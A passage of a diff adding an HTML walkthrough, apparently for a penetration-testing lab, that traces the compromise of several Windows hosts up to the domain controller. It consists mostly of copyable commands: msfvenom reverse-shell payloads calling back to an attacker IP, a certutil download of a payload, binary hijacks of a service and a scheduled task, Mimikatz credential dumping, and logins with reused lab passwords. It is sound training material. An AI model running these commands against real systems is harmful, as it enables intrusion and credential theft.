+        <div class="codebox"><div class="cb-head"><span>cmd</span><button class="copy-btn">Copy</button></div><pre>.\winPEASx64.exe</pre></div>
+        <p>Flags <code class="inline">auditTracker.exe</code> — the executable behind a running service — as writable by "Everyone."</p>
+        <div class="callout concept">
+          <div class="co-head"><span class="icon">i</span>Writable service binaries<span class="chev">▾</span></div>
+          <div class="co-body"><p>If you can write to a service's executable and start/restart that service, you substitute your own program. Windows runs whatever's at that path — including your payload — often as SYSTEM.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.223 LPORT=4444 -f exe -o auditTracker.exe</pre></div>
+        <div class="codebox"><div class="cb-head"><span>cmd</span><button class="copy-btn">Copy</button></div><pre>certutil -urlcache -f http://192.168.45.223:9999/auditTracker.exe auditTracker.exe</pre></div>
+        <div class="codebox"><div class="cb-head"><span>bash / cmd</span><button class="copy-btn">Copy</button></div><pre>nc -lvnp 4444
+sc.exe start auditTracker</pre></div>
+        <div class="flag">🏁 proof.txt captured — SYSTEM</div>
+        <a class="next-target" href="#host-client01"><span><span class="nt-label">Next Target</span><span class="nt-name">CLIENT01 (.82) — Shell as yoshi</span></span><span class="nt-arrow">→</span></a>
+      </div>
+    </div>
+
+    <div class="host-card" id="host-client01">
+      <div class="hc-head">
+        <span class="hc-tag">TARGET 06</span>
+        <div class="hc-titles"><div class="hc-ip">172.16.247.82</div><h3>CLIENT01 — Shell as yoshi</h3></div>
+        <span class="hc-status">MARK COMPROMISED</span><span class="hc-chev">▾</span>
+      </div>
+      <div class="hc-body">
+        <div class="badge-row"><span class="badge">Password reuse</span><span class="badge">psexec.py</span></div>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Where did a yoshi credential come from, and why try it here?<span class="chev">▾</span></div>
+          <div class="co-body"><p>Found on CLIENT01's own SMB shares: <code class="inline">yoshi : Mushroom!</code>, reusing wario's cracked password. Password reuse across accounts is extremely common — always test a reused password against every known username.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>nxc smb 172.16.247.82 -u yoshi -p 'Mushroom!'</pre></div>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why psexec.py here instead of Evil-WinRM?<span class="chev">▾</span></div>
+          <div class="co-body"><p>Evil-WinRM needs WinRM (5985); <code class="inline">psexec.py</code> rides over SMB (445). Match the tool to the open port — the earlier <code class="inline">nxc</code> check already told you which protocol this host accepts.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>psexec.py yoshi:'Mushroom!'@172.16.247.82</pre></div>
+        <div class="callout concept">
+          <div class="co-head"><span class="icon">i</span>psexec.py vs Evil-WinRM<span class="chev">▾</span></div>
+          <div class="co-body"><p><code class="inline">psexec.py</code> (Impacket) uploads a small service executable to <code class="inline">ADMIN$</code> over SMB, registers it as a temporary service, and runs it — popping a SYSTEM shell if your account is a local admin. Evil-WinRM instead uses WinRM/PowerShell Remoting. Same goal, different transport.</p></div>
+        </div>
+        <div class="flag">🏁 proof.txt captured — SYSTEM (yoshi is local admin)</div>
+        <a class="next-target" href="#host-dev04"><span><span class="nt-label">Next Target</span><span class="nt-name">DEV04 (.12) — yoshi → Administrator</span></span><span class="nt-arrow">→</span></a>
+      </div>
+    </div>
+
+    <div class="host-card" id="host-dev04">
+      <div class="hc-head">
+        <span class="hc-tag">TARGET 07</span>
+        <div class="hc-titles"><div class="hc-ip">172.16.247.12</div><h3>DEV04 — yoshi → Administrator</h3></div>
+        <span class="hc-status">MARK COMPROMISED</span><span class="hc-chev">▾</span>
+      </div>
+      <div class="hc-body">
+        <div class="badge-row"><span class="badge">RDP</span><span class="badge">Scheduled task hijack</span><span class="badge">Mimikatz</span></div>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why try yoshi again on a third machine?<span class="chev">▾</span></div>
+          <div class="co-body"><p>No reason to think yoshi's password is limited to one host — same spraying logic. This time RDP is open instead of SMB/WinRM, so the login method changes, but the reuse logic doesn't.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div>
+          <pre>nxc rdp 172.16.247.12 -u yoshi -p 'Mushroom!'
+xfreerdp /u:yoshi /p:'Mushroom!' /v:172.16.247.12</pre></div>
+        <div class="flag">🏁 local.txt captured</div>
+
+        <h4 class="step">Privilege escalation: scheduled task hijack</h4>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why Scheduled Tasks this time instead of services again?<span class="chev">▾</span></div>
+          <div class="co-body"><p>WinPEAS doesn't repeat the same finding on every box — different machines misconfigure differently. Here it's a writable file tied to a Scheduled Task, not a Service. Same underlying vulnerability <em>shape</em>, different trigger — recognizing that shape is the transferable skill.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.223 LPORT=4444 -f exe -o backup.exe</pre></div>
+        <p>Connected over RDP here, so neither certutil nor Evil-WinRM's <code class="inline">upload</code> applies directly — use drive redirection instead:</p>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>xfreerdp /u:yoshi /p:'Mushroom!' /v:172.16.247.12 /drive:kali,/path/on/kali/containing/backup.exe</pre></div>
+        <p class="dim">Mounts your Kali folder as a drive inside the RDP session (typically <code class="inline">\\tsclient\kali</code>) — copy <code class="inline">backup.exe</code> to <code class="inline">C:\TEMP\backup.exe</code>, overwriting the original.</p>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>nc -lvnp 4444</pre></div>
+        <div class="flag">🏁 proof.txt captured — Administrator (after a short delay for the task to fire)</div>
+
+        <h4 class="step">More credential harvesting</h4>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why run Mimikatz again here?<span class="chev">▾</span></div>
+          <div class="co-body"><p>Fresh Administrator on a new host is a fresh opportunity to read LSASS. Harvest on every privileged foothold, not just once — different users log into different machines.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>mimikatz</span><button class="copy-btn">Copy</button></div>
+          <pre>mimikatz.exe
+privilege::debug
+sekurlsa::logonPasswords</pre></div>
+        <p>Recovers: <code class="inline">leon : rabbit:)</code></p>
+        <a class="next-target" href="#host-prod01"><span><span class="nt-label">Next Target</span><span class="nt-name">PROD01 (.13) — leon → SYSTEM</span></span><span class="nt-arrow">→</span></a>
+      </div>
+    </div>
+
+    <div class="host-card" id="host-prod01">
+      <div class="hc-head">
+        <span class="hc-tag">TARGET 08</span>
+        <div class="hc-titles"><div class="hc-ip">172.16.247.13</div><h3>PROD01 — leon → SYSTEM</h3></div>
+        <span class="hc-status">MARK COMPROMISED</span><span class="hc-chev">▾</span>
+      </div>
+      <div class="hc-body">
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why go to PROD01 with leon's credential?<span class="chev">▾</span></div>
+          <div class="co-body"><p>Same logic as every reuse step: a fresh credential is only useful once tested broadly. PROD01 is one of the remaining unchecked hosts.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div>
+          <pre>nxc smb 172.16.247.13 -u leon -p 'rabbit:)'
+psexec.py leon:'rabbit:)'@172.16.247.13</pre></div>
+        <div class="flag">🏁 proof.txt captured — SYSTEM</div>
+        <p class="dim">Run Mimikatz again to dump the local Administrator hash for completeness.</p>
+        <a class="next-target" href="#host-dc01"><span><span class="nt-label">Next Target</span><span class="nt-name">DC01 (.10) — Domain Controller</span></span><span class="nt-arrow">→</span></a>
+      </div>
+    </div>
+
+    <div class="host-card" id="host-dc01">
+      <div class="hc-head">
+        <span class="hc-tag">TARGET 09</span>
+        <div class="hc-titles"><div class="hc-ip">172.16.247.10</div><h3>DC01 — Domain Controller</h3></div>
+        <span class="hc-status">MARK COMPROMISED</span><span class="hc-chev">▾</span>
+      </div>
+      <div class="hc-body">
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why is reaching DC01 the effective end goal?<span class="chev">▾</span></div>
+          <div class="co-body"><p>The Domain Controller holds the master database of every account in the domain, including password hashes for all users. Admin-equivalent access here means you can, in principle, extract every domain credential — the textbook definition of "full domain compromise."</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div>
+          <pre>nxc smb 172.16.247.10 -u leon -p 'rabbit:)'
+psexec.py leon:'rabbit:)'@172.16.247.10</pre></div>
+        <div class="flag">🏁 proof.txt captured — Domain compromised</div>
+        <p>A <code class="inline">credentials.txt</code> next to it contains: <code class="inline">offsec : century62hisan51</code> — creds for the original external WEB01 host.</p>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why would an external host's creds sit on the internal DC?<span class="chev">▾</span></div>
+          <div class="co-body"><p>Real organizations reuse accounts and store notes carelessly across trust boundaries. "External" and "internal" access aren't a one-way door — information gained deep inside a network can loop back to finish off a target you set aside earlier.</p></div>
+        </div>
+        <a class="next-target" href="#host-web01"><span><span class="nt-label">Next Target</span><span class="nt-name">WEB01 (.120) — Closing the Loop</span></span><span class="nt-arrow">→</span></a>
+      </div>
+    </div>
+
+    <div class="host-card" id="host-web01">
+      <div class="hc-head">
+        <span class="hc-tag">TARGET 10</span>
+        <div class="hc-titles"><div class="hc-ip">192.168.247.120</div><h3>WEB01 — Closing the Loop</h3></div>
+        <span class="hc-status">MARK COMPROMISED</span><span class="hc-chev">▾</span>
+      </div>
+      <div class="hc-body">
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why come back to WEB01 now?<span class="chev">▾</span></div>
+          <div class="co-body"><p>You skipped it in Phase 1 — no obvious attack surface, just SSH. That was never a dead end, only a locked door waiting for the right key. The credential from DC01 is that key.</p></div>
+        </div>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>ssh offsec@192.168.247.120</pre></div>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>sudo -l
+sudo su</pre></div>
+        <div class="flag">🏁 proof.txt captured — every host now compromised</div>
+        <a class="next-target" href="#debrief"><span><span class="nt-label">Lab Complete</span><span class="nt-name">Continue to the Debrief →</span></span><span class="nt-arrow">✓</span></a>
+      </div>
+    </div>
+
+    <!-- ============ DEBRIEF ============ -->
+    <hr class="rule">
+    <section class="block" id="debrief">
+      <div class="phase-head"><span class="idx">§4</span><h2>Debrief</h2></div>
+      <p class="phase-desc">Go through this checklist — if you can explain each item in one sentence, without notes, the lab did its job.</p>
+
+      <div class="mastery">
+        <div class="ring">
+          <svg width="64" height="64"><circle cx="32" cy="32" r="27" stroke="var(--border)" stroke-width="6" fill="none"></circle>
+            <circle id="masteryRing" cx="32" cy="32" r="27" stroke="var(--success)" stroke-width="6" fill="none" stroke-dasharray="170" stroke-dashoffset="170" stroke-linecap="round"></circle></svg>
+          <div class="pct" id="masteryPct">0%</div>
+        </div>
+        <div class="mtext"><b>Concept mastery</b>Check off each item below as you can explain it unaided.</div>
+      </div>
+
+      <ul class="checklist" id="checklist">
+        <li><span class="box">✓</span><span class="txt"><b>SQL injection → xp_cmdshell</b> — how untrusted input becomes a database command, and how xp_cmdshell turns that into an OS command.</span></li>
+        <li><span class="box">✓</span><span class="txt"><b>Reverse shells</b> — why the attacker listens and the victim connects out, bypassing inbound firewall rules.</span></li>
+        <li><span class="box">✓</span><span class="txt"><b>Potato exploits</b> — abusing SeImpersonatePrivilege by tricking SYSTEM into authenticating to a local listener, then stealing that token.</span></li>
+        <li><span class="box">✓</span><span class="txt"><b>Mimikatz</b> — reads LSASS memory for cached credentials; privilege::debug first, then sekurlsa::logonPasswords or lsadump::sam.</span></li>
+        <li><span class="box">✓</span><span class="txt"><b>Password cracking vs. reuse</b> — hashcat for offline cracking; a working password is always worth trying against other accounts too.</span></li>
+        <li><span class="box">✓</span><span class="txt"><b>nxc (NetExec)</b> — quickly validates a credential across SMB/WinRM/RDP before committing to a full session.</span></li>
+        <li><span class="box">✓</span><span class="txt"><b>Evil-WinRM vs. psexec.py</b> — both give remote execution with valid creds, over different protocols (WinRM/5985 vs SMB/445).</span></li>
+        <li><span class="box">✓</span><span class="txt"><b>WinPEAS</b> — automates the manual checklist of common Windows misconfigurations.</span></li>
+        <li><span class="box">✓</span><span class="txt"><b>Writable service binaries / scheduled tasks</b> — write access to something a privileged process executes equals a substitution attack.</span></li>
+        <li><span class="box">✓</span><span class="txt"><b>Ligolo-ng</b> — routes your machine's traffic into a network you've only got one foothold in.</span></li>
+        <li><span class="box">✓</span><span class="txt"><b>BloodHound</b> — maps every AD relationship and highlights the shortest path to Domain Admin.</span></li>
+        <li><span class="box">✓</span><span class="txt"><b>The overall AD attack loop</b> — foothold → local privesc → credential harvest → pivot/reuse → repeat, until you reach the Domain Controller. Every transition here was driven by a clue, never a guess.</span></li>
+      </ul>
+    </section>
+
+  </main>
+</div>
+
+<footer>MEDTECH OPERATION DOSSIER — for authorized lab use only</footer>
+
+<script>
+(function(){
+  var TOTAL_HOSTS = 10;
+  var doneHosts = new Set();
+
+  function updateProgress(){
+    var pct = Math.round((doneHosts.size / TOTAL_HOSTS) * 100);
+    document.getElementById('progressText').textContent = doneHosts.size + ' / ' + TOTAL_HOSTS;
+    document.getElementById('progressFill').style.width = pct + '%';
+    var circ = 170;
+    var ring = document.getElementById('masteryRing');
+    if(ring){ ring.style.strokeDashoffset = (circ - (circ*pct/100)); }
+    var mp = document.getElementById('masteryPct'); if(mp){ mp.textContent = pct + '%'; }
+  }
+
+  function toggleHost(hostId){
+    var card = document.getElementById('host-' + hostId);
+    var navDot = document.querySelector('a[data-host="' + hostId + '"]');
+    var node = document.querySelector('#netmap .node[data-host="' + hostId + '"]');
+    if(doneHosts.has(hostId)){
+      doneHosts.delete(hostId);
+      card && card.classList.remove('done');
+      navDot && navDot.classList.remove('done');
+      node && node.classList.remove('done');
+    } else {
+      doneHosts.add(hostId);
+      card && card.classList.add('done');
+      navDot && navDot.classList.add('done');
+      node && node.classList.add('done');
+    }
+    updateProgress();
+  }
+
+  document.querySelectorAll('.host-card').forEach(function(card, idx){
+    var hostId = card.id.replace('host-', '');
+    var statusBtn = card.querySelector('.hc-status');
+    statusBtn.addEventListener('click', function(e){
+      e.stopPropagation();
+      toggleHost(hostId);
+      statusBtn.textContent = doneHosts.has(hostId) ? 'COMPROMISED ✓' : 'MARK COMPROMISED';
+    });
+    var head = card.querySelector('.hc-head');
+    head.addEventListener('click', function(e){
+      if(e.target === statusBtn) return;
+      card.classList.toggle('collapsed');
+    });
+    // Default: only the very first target starts open, so the page
+    // reads as one target at a time instead of a wall of content.
+    if(idx !== 0){ card.classList.add('collapsed'); }
+  });
+
+  document.querySelectorAll('#netmap .node').forEach(function(node){
+    node.addEventListener('click', function(){
+      var hostId = node.getAttribute('data-host');
+      var target = document.getElementById('host-' + hostId) || document.getElementById(hostId);
+      if(target){
+        target.classList.remove('collapsed');
+        target.scrollIntoView({behavior:'smooth', block:'start'});
+      }
+    });
+  });
+
+  // "Next target" CTA: expand the target card, then scroll to it
+  document.querySelectorAll('.next-target').forEach(function(a){
+    a.addEventListener('click', function(e){
+      e.preventDefault();
+      var target = document.querySelector(a.getAttribute('href'));
+      if(target){
+        target.classList.remove('collapsed');
+        target.scrollIntoView({behavior:'smooth', block:'start'});
+      }
+    });
+  });
+
+  // callouts: collapsed (compact chip) by default, expand on click
+  var allCallouts = document.querySelectorAll('.callout');
+  document.querySelectorAll('.callout .co-head').forEach(function(h){
+    h.addEventListener('click', function(){
+      h.parentElement.classList.toggle('open');
+    });
+  });
+
+  var expandAllBtn = document.getElementById('expandAllReasoning');
+  var collapseAllBtn = document.getElementById('collapseAllReasoning');
+  if(expandAllBtn){
+    expandAllBtn.addEventListener('click', function(){
+      allCallouts.forEach(function(c){ c.classList.add('open'); });
+    });
+  }
+  if(collapseAllBtn){
+    collapseAllBtn.addEventListener('click', function(){
+      allCallouts.forEach(function(c){ c.classList.remove('open'); });
+    });
+  }
+
+  // copy buttons
+  document.querySelectorAll('.copy-btn').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var pre = btn.closest('.codebox').querySelector('pre');
+      var text = pre.textContent;
+      navigator.clipboard.writeText(text).then(function(){
+        btn.textContent = 'Copied!';
+        btn.classList.add('copied');
+        setTimeout(function(){ btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1500);
+      }).catch(function(){
+        btn.textContent = 'Error';
+      });
+    });
+  });
+
+  // checklist
+  document.querySelectorAll('#checklist li').forEach(function(li){
+    li.addEventListener('click', function(){
+      li.classList.toggle('checked');
+      var checked = document.querySelectorAll('#checklist li.checked').length;
+      var total = document.querySelectorAll('#checklist li').length;
+      var pct = Math.round((checked/total)*100);
+      var circ = 170;
+      var ring = document.getElementById('masteryRing');
+      ring.style.strokeDashoffset = (circ - (circ*pct/100));
+      document.getElementById('masteryPct').textContent = pct + '%';
+    });
+  });
+
+  // sidebar scrollspy
+  var links = Array.prototype.slice.call(document.querySelectorAll('nav.toc a'));
+  var sections = links.map(function(l){ return document.querySelector(l.getAttribute('href')); }).filter(Boolean);
+  function onScroll(){
+    var pos = window.scrollY + 120;
+    var current = sections[0];
+    sections.forEach(function(sec){ if(sec.offsetTop <= pos) current = sec; });
+    links.forEach(function(l){ l.classList.remove('active'); });
+    if(current){
+      var match = links.find(function(l){ return document.querySelector(l.getAttribute('href')) === current; });
+      match && match.classList.add('active');
+    }
+  }
+  document.addEventListener('scroll', onScroll, {passive:true});
+  onScroll();
+
+  // mobile nav
+  var toggle = document.getElementById('navToggle');
+  var sidebar = document.getElementById('sidebar');
+  var scrim = document.getElementById('scrim');
+  if(toggle){
+    toggle.addEventListener('click', function(){
+      sidebar.classList.toggle('open');
+      scrim.classList.toggle('show');
+    });
+    scrim.addEventListener('click', function(){
+      sidebar.classList.remove('open');
+      scrim.classList.remove('show');
+    });
+    links.forEach(function(l){ l.addEventListener('click', function(){
+      sidebar.classList.remove('open'); scrim.classList.remove('show');
+    });});
+  }
+
+  updateProgress();
+})();
+</script>
+</body>
+</html>
